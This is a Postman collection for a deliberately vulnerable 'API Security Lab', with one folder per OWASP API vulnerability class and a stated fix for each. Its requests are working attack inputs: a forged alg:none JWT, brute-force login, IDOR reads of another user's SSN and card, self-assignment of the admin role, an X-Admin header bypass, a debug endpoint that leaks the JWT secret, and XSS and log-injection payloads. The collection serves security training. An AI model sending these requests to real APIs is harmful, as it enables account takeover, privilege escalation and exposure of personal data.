@@ -1,0 +1,714 @@
+{
+  "info": {
+    "name": "API Security Lab",
+    "description": "Learning collection for API security. Each folder covers one vulnerability class from the OWASP API Security Top 10. Run requests in order within each folder — earlier requests set up tokens and IDs used by later ones.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "item": [
+
+    {
+      "name": "SETUP — Get Tokens",
+      "description": "Run these first. They populate {{token_alice}}, {{token_bob}}, {{user_id_alice}}, {{user_id_bob}} in your environment.",
+      "item": [
+        {
+          "name": "Login as Alice (admin)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"alice@lab.local\",\n  \"password\": \"Password1!\"\n}"
+            },
+            "url": { "raw": "{{base_url}}/api/auth/login", "host": ["{{base_url}}"], "path": ["api", "auth", "login"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('Login succeeds', () => pm.expect(pm.response.code).to.equal(200));",
+                "const json = pm.response.json();",
+                "pm.environment.set('token_alice', json.token);",
+                "pm.environment.set('user_id_alice', json.user.id);",
+                "console.log('Alice token saved. User ID:', json.user.id);"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        },
+        {
+          "name": "Login as Bob (regular user)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"bob@lab.local\",\n  \"password\": \"Password2!\"\n}"
+            },
+            "url": { "raw": "{{base_url}}/api/auth/login", "host": ["{{base_url}}"], "path": ["api", "auth", "login"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('Login succeeds', () => pm.expect(pm.response.code).to.equal(200));",
+                "const json = pm.response.json();",
+                "pm.environment.set('token_bob', json.token);",
+                "pm.environment.set('user_id_bob', json.user.id);",
+                "console.log('Bob token saved. User ID:', json.user.id);"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        }
+      ]
+    },
+
+    {
+      "name": "VULN-01+02 — Broken Authentication",
+      "description": "Demonstrates: weak JWT secret, no token expiry.\n\nWhat to learn:\n- JWT tokens signed with 'secret123' can be forged offline (jwt.io)\n- Tokens never expire — stolen tokens work forever\n\nFix:\n- Use long random secret from env\n- Set expiresIn: '1h' when signing\n- Validate exp claim on every request",
+      "item": [
+        {
+          "name": "Decode JWT without verifying (jwt.io equivalent)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": { "raw": "{{base_url}}/api/users/me", "host": ["{{base_url}}"], "path": ["api", "users", "me"] }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "exec": [
+                  "// Manually decode JWT payload (base64) to inspect claims",
+                  "const token = pm.environment.get('token_alice');",
+                  "if (token) {",
+                  "    const payload = JSON.parse(atob(token.split('.')[1]));",
+                  "    console.log('JWT payload:', JSON.stringify(payload, null, 2));",
+                  "    console.log('Notice: no exp (expiry) field — token lives forever!');",
+                  "    pm.environment.set('jwt_payload', JSON.stringify(payload));",
+                  "}"
+                ],
+                "type": "text/javascript"
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Request succeeds with token', () => pm.expect(pm.response.code).to.equal(200));",
+                  "",
+                  "// Check if token has expiry",
+                  "const token = pm.environment.get('token_alice');",
+                  "const payload = JSON.parse(atob(token.split('.')[1]));",
+                  "pm.test('[FINDING] JWT has no expiry (exp claim missing)', () => {",
+                  "    pm.expect(payload.exp).to.be.undefined;",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
+        },
+        {
+          "name": "Use a forged token (alg:none attack)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6InUtMDAxIiwiZW1haWwiOiJhbGljZUBsYWIubG9jYWwiLCJyb2xlIjoiYWRtaW4ifQ."
+              }
+            ],
+            "url": { "raw": "{{base_url}}/api/users/me", "host": ["{{base_url}}"], "path": ["api", "users", "me"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "// alg:none means no signature — library should reject this",
+                "// jsonwebtoken v9 rejects alg:none by default (good)",
+                "// Older libraries or misconfigured ones accept it",
+                "pm.test('alg:none token should be rejected (401)', () => {",
+                "    pm.expect(pm.response.code).to.equal(401);",
+                "});",
+                "console.log('Result:', pm.response.code, '— if 200, library is vulnerable to alg:none attack');"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        },
+        {
+          "name": "Brute-force login (VULN-08 — No Rate Limiting)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"alice@lab.local\",\n  \"password\": \"{{brute_password}}\"\n}"
+            },
+            "url": { "raw": "{{base_url}}/api/auth/login", "host": ["{{base_url}}"], "path": ["api", "auth", "login"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "// Run this with Collection Runner, set brute_password to a list",
+                "// The server will never block you — no rate limiting in place",
+                "pm.test('No rate limiting in place', () => {",
+                "    // If server had rate limiting, we'd see 429 after N attempts",
+                "    pm.expect(pm.response.code).to.not.equal(429);",
+                "});",
+                "console.log('Attempt with password:', pm.environment.get('brute_password'), '→', pm.response.code);"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        }
+      ]
+    },
+
+    {
+      "name": "VULN-03 — IDOR / BOLA (Broken Object Level Authorization)",
+      "description": "Bob (a regular user) can read Alice's private data by guessing her user ID.\n\nFix: Always check that req.user.id === resourceOwnerId before returning data.",
+      "item": [
+        {
+          "name": "Bob reads his own profile (baseline — OK)",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{token_bob}}" }],
+            "url": { "raw": "{{base_url}}/api/users/{{user_id_bob}}", "host": ["{{base_url}}"], "path": ["api", "users", "{{user_id_bob}}"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('Bob can read own profile', () => pm.expect(pm.response.code).to.equal(200));",
+                "const json = pm.response.json();",
+                "pm.test('Returns correct user', () => pm.expect(json.email).to.equal('bob@lab.local'));"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        },
+        {
+          "name": "Bob reads ALICE's profile (IDOR exploit)",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{token_bob}}" }],
+            "url": { "raw": "{{base_url}}/api/users/{{user_id_alice}}", "host": ["{{base_url}}"], "path": ["api", "users", "{{user_id_alice}}"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('[EXPLOIT] Bob accessed Alice\\'s data', () => {",
+                "    pm.expect(pm.response.code).to.equal(200);",
+                "});",
+                "const json = pm.response.json();",
+                "pm.test('[EXPLOIT] Alice\\'s SSN exposed to Bob', () => {",
+                "    pm.expect(json.ssn).to.exist;",
+                "    console.log('Alice SSN:', json.ssn);",
+                "    console.log('Alice credit card:', json.creditCard);",
+                "});",
+                "console.log('[VULN-03] Bob should have received 403, got:', pm.response.code);"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        },
+        {
+          "name": "Bob reads an order placed by Alice (IDOR on orders)",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{token_bob}}" }],
+            "url": { "raw": "{{base_url}}/api/orders/{{alice_order_id}}", "host": ["{{base_url}}"], "path": ["api", "orders", "{{alice_order_id}}"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "// Set alice_order_id in environment after Alice places an order",
+                "if (pm.response.code === 200) {",
+                "    pm.test('[EXPLOIT] Bob accessed Alice\\'s order', () => {",
+                "        pm.expect(pm.response.code).to.equal(200);",
+                "    });",
+                "} else {",
+                "    console.log('Place an order as Alice first, then copy the order ID to alice_order_id env var');",
+                "}"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        }
+      ]
+    },
+
+    {
+      "name": "VULN-04 — Excessive Data Exposure",
+      "description": "The API returns sensitive fields (ssn, creditCard, password hash) that clients should never see.\n\nFix: Use a response serializer / allowlist — only return { id, name, email, role }.",
+      "item": [
+        {
+          "name": "GET /api/users/me — observe all returned fields",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{token_bob}}" }],
+            "url": { "raw": "{{base_url}}/api/users/me", "host": ["{{base_url}}"], "path": ["api", "users", "me"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('Response is 200', () => pm.expect(pm.response.code).to.equal(200));",
+                "const json = pm.response.json();",
+                "",
+                "pm.test('[FINDING] SSN returned to client', () => {",
+                "    pm.expect(json.ssn).to.exist;",
+                "    console.log('SSN in response:', json.ssn);",
+                "});",
+                "",
+                "pm.test('[FINDING] Credit card returned to client', () => {",
+                "    pm.expect(json.creditCard).to.exist;",
+                "    console.log('Credit card:', json.creditCard);",
+                "});",
+                "",
+                "pm.test('[FINDING] Password hash returned to client', () => {",
+                "    pm.expect(json.password).to.exist;",
+                "    console.log('Password hash:', json.password);",
+                "    console.log('This can be cracked offline with hashcat/john');",
+                "});"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        },
+        {
+          "name": "Register — observe password hash in response",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"name\": \"Test User\",\n  \"email\": \"test{{$randomInt}}@lab.local\",\n  \"password\": \"TestPass123!\"\n}"
+            },
+            "url": { "raw": "{{base_url}}/api/auth/register", "host": ["{{base_url}}"], "path": ["api", "auth", "register"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('Registration succeeds', () => pm.expect(pm.response.code).to.equal(201));",
+                "const json = pm.response.json();",
+                "pm.test('[FINDING] Password hash in register response', () => {",
+                "    pm.expect(json.user.password).to.exist;",
+                "    console.log('Hash exposed:', json.user.password);",
+                "});"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        }
+      ]
+    },
+
+    {
+      "name": "VULN-05 — Mass Assignment (Privilege Escalation)",
+      "description": "A regular user can set their own role to 'admin' during registration or update.\n\nFix: Never accept role/isAdmin from user input. Strip or whitelist accepted fields.",
+      "item": [
+        {
+          "name": "Register with role: admin (privilege escalation)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"name\": \"Evil User\",\n  \"email\": \"evil{{$randomInt}}@lab.local\",\n  \"password\": \"Evil1234!\",\n  \"role\": \"admin\"\n}"
+            },
+            "url": { "raw": "{{base_url}}/api/auth/register", "host": ["{{base_url}}"], "path": ["api", "auth", "register"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('Register succeeds', () => pm.expect(pm.response.code).to.equal(201));",
+                "const json = pm.response.json();",
+                "pm.test('[EXPLOIT] User self-assigned admin role', () => {",
+                "    pm.expect(json.user.role).to.equal('admin');",
+                "    console.log('Registered role:', json.user.role);",
+                "});",
+                "pm.environment.set('evil_email', json.user.email);"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        },
+        {
+          "name": "Login as the new self-made admin",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{evil_email}}\",\n  \"password\": \"Evil1234!\"\n}"
+            },
+            "url": { "raw": "{{base_url}}/api/auth/login", "host": ["{{base_url}}"], "path": ["api", "auth", "login"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "const json = pm.response.json();",
+                "pm.environment.set('token_evil_admin', json.token);",
+                "pm.test('[EXPLOIT] Evil user has admin token', () => {",
+                "    pm.expect(json.user.role).to.equal('admin');",
+                "});"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        },
+        {
+          "name": "Elevate Bob to admin via PUT (mass assignment on update)",
+          "request": {
+            "method": "PUT",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{token_bob}}" },
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"role\": \"admin\"\n}"
+            },
+            "url": { "raw": "{{base_url}}/api/users/{{user_id_bob}}", "host": ["{{base_url}}"], "path": ["api", "users", "{{user_id_bob}}"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('Update succeeds', () => pm.expect(pm.response.code).to.equal(200));",
+                "const json = pm.response.json();",
+                "pm.test('[EXPLOIT] Bob escalated himself to admin', () => {",
+                "    pm.expect(json.user.role).to.equal('admin');",
+                "    console.log('Bob role is now:', json.user.role);",
+                "});"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        }
+      ]
+    },
+
+    {
+      "name": "VULN-07 — Broken Function Level Authorization",
+      "description": "The admin check on GET /api/admin/users reads a header (X-Admin: true) instead of the JWT role. Any user can bypass this.\n\nFix: Check req.user.role === 'admin' from the verified JWT payload.",
+      "item": [
+        {
+          "name": "Bob accesses admin route WITHOUT X-Admin header (blocked)",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{token_bob}}" }],
+            "url": { "raw": "{{base_url}}/api/admin/users", "host": ["{{base_url}}"], "path": ["api", "admin", "users"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('Blocked without header', () => pm.expect(pm.response.code).to.equal(403));"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        },
+        {
+          "name": "Bob bypasses admin check with X-Admin: true header",
+          "request": {
+            "method": "GET",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{token_bob}}" },
+              { "key": "X-Admin", "value": "true" }
+            ],
+            "url": { "raw": "{{base_url}}/api/admin/users", "host": ["{{base_url}}"], "path": ["api", "admin", "users"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('[EXPLOIT] Bob accessed admin endpoint with header trick', () => {",
+                "    pm.expect(pm.response.code).to.equal(200);",
+                "});",
+                "const json = pm.response.json();",
+                "pm.test('[EXPLOIT] All user data including SSN exposed', () => {",
+                "    pm.expect(json.users).to.be.an('array');",
+                "    console.log('Users returned:', json.users.length);",
+                "    json.users.forEach(u => console.log(u.email, '| SSN:', u.ssn));",
+                "});"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        },
+        {
+          "name": "GET /api/admin/debug — Full server info disclosure",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": { "raw": "{{base_url}}/api/admin/debug", "host": ["{{base_url}}"], "path": ["api", "admin", "debug"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('[EXPLOIT] Debug endpoint accessible with no auth', () => {",
+                "    pm.expect(pm.response.code).to.equal(200);",
+                "});",
+                "const json = pm.response.json();",
+                "pm.test('[EXPLOIT] JWT secret exposed', () => {",
+                "    pm.expect(json.jwtSecret).to.exist;",
+                "    console.log('JWT Secret:', json.jwtSecret);",
+                "    console.log('With this secret you can forge any token');",
+                "});"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        }
+      ]
+    },
+
+    {
+      "name": "VULN-09+10 — Security Misconfiguration",
+      "description": "Missing security headers and verbose error messages reveal internals.\n\nFix: Use helmet middleware, generic error responses, and remove debug endpoints.",
+      "item": [
+        {
+          "name": "Check security headers on any response",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": { "raw": "{{base_url}}/api/products", "host": ["{{base_url}}"], "path": ["api", "products"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('[FINDING] X-Content-Type-Options missing', () => {",
+                "    pm.expect(pm.response.headers.get('X-Content-Type-Options')).to.not.exist;",
+                "});",
+                "pm.test('[FINDING] X-Frame-Options missing', () => {",
+                "    pm.expect(pm.response.headers.get('X-Frame-Options')).to.not.exist;",
+                "});",
+                "pm.test('[FINDING] X-Powered-By reveals Express', () => {",
+                "    const powered = pm.response.headers.get('X-Powered-By');",
+                "    pm.expect(powered).to.equal('Express');",
+                "    console.log('X-Powered-By:', powered, '— reveals tech stack');",
+                "});",
+                "pm.test('[FINDING] No Content-Security-Policy header', () => {",
+                "    pm.expect(pm.response.headers.get('Content-Security-Policy')).to.not.exist;",
+                "});"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        },
+        {
+          "name": "Trigger verbose error with malformed JSON",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{token_bob}}" },
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{ this is not valid json }"
+            },
+            "url": { "raw": "{{base_url}}/api/auth/login", "host": ["{{base_url}}"], "path": ["api", "auth", "login"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('Server handles malformed JSON', () => {",
+                "    pm.expect([400, 500]).to.include(pm.response.code);",
+                "});",
+                "console.log('Error response body:', pm.response.text());"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        }
+      ]
+    },
+
+    {
+      "name": "VULN-11 — Reflected Input (Search Endpoint)",
+      "description": "User input from ?q= is reflected directly in the JSON response.\n\nFix: Sanitize or encode output; never reflect raw input back.",
+      "item": [
+        {
+          "name": "Normal product search",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/products/search?q=widget",
+              "host": ["{{base_url}}"],
+              "path": ["api", "products", "search"],
+              "query": [{ "key": "q", "value": "widget" }]
+            }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('Search returns results', () => pm.expect(pm.response.code).to.equal(200));",
+                "const json = pm.response.json();",
+                "pm.test('Query reflected in response', () => {",
+                "    pm.expect(json.query).to.equal('widget');",
+                "});"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        },
+        {
+          "name": "Search with XSS payload in q param",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/products/search?q=<script>alert(1)</script>",
+              "host": ["{{base_url}}"],
+              "path": ["api", "products", "search"],
+              "query": [{ "key": "q", "value": "<script>alert(1)</script>" }]
+            }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "const json = pm.response.json();",
+                "pm.test('[FINDING] XSS payload reflected raw in JSON', () => {",
+                "    pm.expect(json.query).to.include('<script>');",
+                "    console.log('Reflected value:', json.query);",
+                "    console.log('In JSON APIs this is low XSS risk, but dangerous if response is rendered as HTML or logged');",
+                "});"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        },
+        {
+          "name": "Search with log injection payload",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/products/search?q=normal%0aFAKE LOG: admin logged in",
+              "host": ["{{base_url}}"],
+              "path": ["api", "products", "search"],
+              "query": [{ "key": "q", "value": "normal\nFAKE LOG: admin logged in" }]
+            }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('[FINDING] Newline in input — potential log injection', () => {",
+                "    const json = pm.response.json();",
+                "    pm.expect(json.query).to.include('\\n');",
+                "    console.log('If server logs the query, log is now forged');",
+                "});"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        }
+      ]
+    },
+
+    {
+      "name": "VULN-12 — Missing Input Validation",
+      "description": "Register accepts any email format, empty names, extremely long strings, etc.\n\nFix: Validate all inputs with a schema library (e.g., Joi, Zod, express-validator).",
+      "item": [
+        {
+          "name": "Register with invalid email format",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"name\": \"Bad Email User\",\n  \"email\": \"not-an-email\",\n  \"password\": \"Pass1234!\"\n}"
+            },
+            "url": { "raw": "{{base_url}}/api/auth/register", "host": ["{{base_url}}"], "path": ["api", "auth", "register"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('[FINDING] Invalid email accepted (should be 400)', () => {",
+                "    // Server accepts it — no format validation",
+                "    pm.expect(pm.response.code).to.equal(201);",
+                "    console.log('Invalid email was accepted:', pm.response.json().user.email);",
+                "});"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        },
+        {
+          "name": "Register with very long inputs (DoS test)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"name\": \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\",\n  \"email\": \"long{{$randomInt}}@lab.local\",\n  \"password\": \"Pass1234!\"\n}"
+            },
+            "url": { "raw": "{{base_url}}/api/auth/register", "host": ["{{base_url}}"], "path": ["api", "auth", "register"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('Server handles long input without crashing', () => {",
+                "    pm.expect([201, 400]).to.include(pm.response.code);",
+                "});",
+                "console.log('Response code for oversized input:', pm.response.code);"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        },
+        {
+          "name": "Order with negative quantity (business logic flaw)",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{token_bob}}" },
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"productId\": \"p-001\",\n  \"quantity\": -100\n}"
+            },
+            "url": { "raw": "{{base_url}}/api/orders", "host": ["{{base_url}}"], "path": ["api", "orders"] }
+          },
+          "event": [{
+            "listen": "test",
+            "script": {
+              "exec": [
+                "pm.test('[FINDING] Negative quantity accepted — stock manipulation', () => {",
+                "    pm.expect(pm.response.code).to.equal(201);",
+                "    const json = pm.response.json();",
+                "    console.log('Total for -100 items:', json.order.total, '(negative = credit)');",
+                "    console.log('Stock increased by 100 — business logic bypass');",
+                "});"
+              ],
+              "type": "text/javascript"
+            }
+          }]
+        }
+      ]
+    }
+
+  ]
+}
